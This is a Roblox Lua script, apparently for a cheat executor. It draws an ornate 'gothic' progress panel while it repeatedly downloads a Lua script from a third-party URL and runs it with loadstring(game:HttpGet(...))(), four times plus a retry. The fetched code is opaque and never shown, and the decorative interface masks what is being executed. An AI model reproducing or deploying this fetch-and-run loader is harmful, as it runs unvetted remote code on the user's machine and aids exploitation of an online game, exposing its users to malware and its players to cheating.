local player = game.Players.LocalPlayer

-- ===============================
-- GOTHIC WARNING GUI
-- ===============================
local gui = Instance.new("ScreenGui")
gui.Name = "GothicExecutionWarning"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 420, 0, 180)
frame.Position = UDim2.new(0.5, -210, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(15, 12, 20)
frame.BorderSizePixel = 0
frame.Parent = gui

-- Gothic corner
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

-- Ornate border
local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 3
stroke.Color = Color3.fromRGB(200, 170, 100)
stroke.Transparency = 0.3
stroke.Parent = frame

-- Inner shadow border
local innerFrame = Instance.new("Frame")
innerFrame.Size = UDim2.new(1, -6, 1, -6)
innerFrame.Position = UDim2.new(0, 3, 0, 3)
innerFrame.BackgroundTransparency = 1
innerFrame.BorderSizePixel = 0
innerFrame.Parent = frame

local innerStroke = Instance.new("UIStroke", innerFrame)
innerStroke.Thickness = 1
innerStroke.Color = Color3.fromRGB(100, 80, 120)
innerStroke.Transparency = 0.5
innerStroke.Parent = innerFrame

-- Main title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Font = Enum.Font.Garamond
title.TextSize = 26
title.TextColor3 = Color3.fromRGB(200, 170, 100)
title.Text = "⚜ QUAD EXECUTION RITUAL ⚜"
title.TextStrokeTransparency = 0.7
title.TextStrokeColor3 = Color3.fromRGB(10, 10, 12)
title.Parent = frame

-- Main text
local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, -40, 0, 60)
text.Position = UDim2.new(0, 20, 0, 60)
text.BackgroundTransparency = 1
text.TextWrapped = true
text.Font = Enum.Font.Garamond
text.TextSize = 18
text.TextColor3 = Color3.fromRGB(180, 180, 185)
text.Text = "Initiating rapid quad sequence..."
text.TextStrokeTransparency = 0.8
text.Parent = frame

-- Progress text
local progress = Instance.new("TextLabel")
progress.Size = UDim2.new(1, -40, 0, 30)
progress.Position = UDim2.new(0, 20, 0, 125)
progress.BackgroundTransparency = 1
progress.Font = Enum.Font.Garamond
progress.TextSize = 16
progress.TextColor3 = Color3.fromRGB(150, 130, 70)
progress.Text = "Execution: 0/4"
progress.TextStrokeTransparency = 0.8
progress.Parent = frame

-- Status text
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -40, 0, 20)
status.Position = UDim2.new(0, 20, 0, 155)
status.BackgroundTransparency = 1
status.Font = Enum.Font.Garamond
status.TextSize = 14
status.TextColor3 = Color3.fromRGB(120, 120, 120)
status.Text = "Status: Beginning rapid execution..."
status.TextStrokeTransparency = 0.8
status.Parent = frame

-- Ornate corners
local function createOrnament(posX, posY, anchorX, anchorY)
    local ornament = Instance.new("Frame")
    ornament.Size = UDim2.new(0, 12, 0, 12)
    ornament.Position = UDim2.new(posX, 0, posY, 0)
    ornament.AnchorPoint = Vector2.new(anchorX, anchorY)
    ornament.BackgroundColor3 = Color3.fromRGB(200, 170, 100)
    ornament.BackgroundTransparency = 0.5
    ornament.BorderSizePixel = 0
    ornament.Parent = frame
    
    local ornamentCorner = Instance.new("UICorner")
    ornamentCorner.CornerRadius = UDim.new(0, 3)
    ornamentCorner.Parent = ornament
    
    return ornament
end

-- Create 4 corner ornaments
createOrnament(0, 0, 0, 0)
createOrnament(1, 0, 1, 0)
createOrnament(0, 1, 0, 1)
createOrnament(1, 1, 1, 1)

-- ===============================
-- SIMPLE JUNKIE EXECUTION
-- ===============================
local JUNKIE_URL = "https://api.junkie-development.de/api/v1/luascripts/public/3e73ebff1af450511d7cf0bda858517be15f5f269ac343792ac557701ce4a4f1/download"

-- Animation pulse
task.spawn(function()
    local pulse = 0
    while gui and gui.Parent do
        pulse = (pulse + 0.1) % (math.pi * 2) -- Faster pulse for rapid execution
        local glow = 0.3 + (math.sin(pulse) * 0.2)
        stroke.Transparency = glow
        task.wait(0.05) -- Faster pulse update
    end
end)

-- Main ritual function
local function performRitual()
    local maxExecutions = 4
    local extraRetries = 1 -- Extra retry if first fails
    local totalAttempts = 0
    local successfulExecutions = 0
    local failedFirst = false
    
    -- Initial fast preparation phase
    title.Text = "⚜ RAPID QUAD PREPARATION ⚜"
    text.Text = "Preparing for 4 fast executions..."
    status.Text = "Status: Turbo charging..."
    
    -- Quick preparation animation
    for i = 1, 5 do
        stroke.Color = Color3.fromHSV(i * 0.2, 0.8, 0.8)
        task.wait(0.1)
    end
    
    -- EXECUTE 4 TIMES FAST
    for execution = 1, maxExecutions do
        progress.Text = string.format("Execution: %d/%d", execution, maxExecutions)
        title.Text = string.format("⚜ EXECUTION %d/%d ⚜", execution, maxExecutions)
        text.Text = string.format("Running execution %d...", execution)
        status.Text = "Status: Rapid execution in progress..."
        status.TextColor3 = Color3.fromRGB(200, 170, 100)
        
        -- Execute Junkie (protected with pcall)
        local success, err = pcall(function()
            loadstring(game:HttpGet(JUNKIE_URL))()
        end)
        
        if success then
            text.Text = string.format("Execution %d successful!", execution)
            status.Text = "✓ Success!"
            status.TextColor3 = Color3.fromRGB(100, 255, 100)
            successfulExecutions = successfulExecutions + 1
            
            -- Quick success flash
            stroke.Color = Color3.fromRGB(100, 255, 100)
            task.wait(0.1)
            stroke.Color = Color3.fromRGB(200, 170, 100)
        else
            text.Text = string.format("Execution %d failed", execution)
            status.Text = "✗ Failed!"
            status.TextColor3 = Color3.fromRGB(255, 100, 100)
            
            -- Quick error flash
            stroke.Color = Color3.fromRGB(255, 100, 100)
            task.wait(0.1)
            stroke.Color = Color3.fromRGB(200, 170, 100)
            
            -- Track if first execution failed
            if execution == 1 then
                failedFirst = true
            end
        end
        
        totalAttempts = totalAttempts + 1
        
        -- Fast delay between executions (except last one)
        if execution < maxExecutions then
            task.wait(0.3) -- Very fast between executions
        end
    end
    
    -- EXTRA RETRY IF FIRST EXECUTION FAILED
    if failedFirst and extraRetries > 0 then
        title.Text = "⚜ EXTRA RETRY ATTEMPT ⚜"
        text.Text = "First execution failed, retrying..."
        status.Text = "Status: Attempting recovery..."
        status.TextColor3 = Color3.fromRGB(255, 200, 100)
        
        task.wait(0.5)
        
        progress.Text = string.format("Extra Retry: %d/%d", successfulExecutions + 1, maxExecutions)
        
        local success, err = pcall(function()
            loadstring(game:HttpGet(JUNKIE_URL))()
        end)
        
        if success then
            text.Text = "Extra retry successful!"
            status.Text = "✓ Recovery successful!"
            status.TextColor3 = Color3.fromRGB(100, 255, 100)
            successfulExecutions = successfulExecutions + 1
            
            -- Success flash
            for i = 1, 3 do
                stroke.Color = Color3.fromRGB(100, 255, 100)
                task.wait(0.1)
                stroke.Color = Color3.fromRGB(200, 170, 100)
                task.wait(0.1)
            end
        else
            text.Text = "Extra retry also failed"
            status.Text = "✗ Recovery failed"
            status.TextColor3 = Color3.fromRGB(255, 150, 100)
        end
        
        totalAttempts = totalAttempts + 1
    end
    
    -- FINAL RESULTS
    title.Text = "⚜ QUAD EXECUTION COMPLETE ⚜"
    progress.Text = string.format("Results: %d/%d successful", successfulExecutions, maxExecutions)
    
    if successfulExecutions == maxExecutions then
        text.Text = "All 4 executions successful!"
        text.TextColor3 = Color3.fromRGB(100, 255, 100)
        status.Text = "✓ Perfect quad execution!"
        status.TextColor3 = Color3.fromRGB(100, 255, 100)
    elseif successfulExecutions > 0 then
        text.Text = string.format("%d out of 4 executions worked!", successfulExecutions)
        text.TextColor3 = Color3.fromRGB(255, 200, 100)
        status.Text = "Partial success achieved"
        status.TextColor3 = Color3.fromRGB(255, 200, 100)
    else
        text.Text = "All executions failed"
        text.TextColor3 = Color3.fromRGB(255, 100, 100)
        status.Text = "✗ No executions succeeded"
        status.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
    
    -- Fast victory celebration
    for i = 1, 10 do
        stroke.Color = Color3.fromHSV(
            (i * 0.15) % 1,
            0.8,
            0.8 + math.sin(i * 0.5) * 0.2
        )
        
        -- Quick pulse effect
        local scale = 1 + math.sin(i * 0.8) * 0.03
        frame.Size = UDim2.new(0, 420 * scale, 0, 180 * scale)
        frame.Position = UDim2.new(0.5, -210 * scale, 0.3, -90 * (scale - 1))
        
        task.wait(0.08) -- Faster celebration
    end
    
    -- Reset size
    frame.Size = UDim2.new(0, 420, 0, 180)
    frame.Position = UDim2.new(0.5, -210, 0.3, 0)
    
    -- Final message
    if successfulExecutions > 0 then
        text.Text = "Junkie system activated!"
    else
        text.Text = "System failed to activate"
    end
    
    -- Fast fade out
    task.wait(2)
    for i = 1, 15 do
        local fade = i / 15
        frame.BackgroundTransparency = fade
        stroke.Transparency = 0.3 + (fade * 0.7)
        text.TextTransparency = fade
        title.TextTransparency = fade
        progress.TextTransparency = fade
        status.TextTransparency = fade
        task.wait(0.03) -- Faster fade
    end
    
    -- Destroy GUI
    gui:Destroy()
end

-- Start ritual with fast dramatic entrance
task.spawn(function()
    -- Initial hidden state
    frame.BackgroundTransparency = 1
    stroke.Transparency = 1
    text.TextTransparency = 1
    title.TextTransparency = 1
    progress.TextTransparency = 1
    status.TextTransparency = 1
    
    -- Fast fade in
    for i = 1, 10 do
        local fade = 1 - (i / 10)
        frame.BackgroundTransparency = fade
        stroke.Transparency = 0.3 + (fade * 0.7)
        text.TextTransparency = fade
        title.TextTransparency = fade
        progress.TextTransparency = fade
        status.TextTransparency = fade
        task.wait(0.02) -- Very fast fade in
    end
    
    -- Start the ritual
    performRitual()
end)

print("⚜ Rapid quad execution ritual initiated! ⚜")
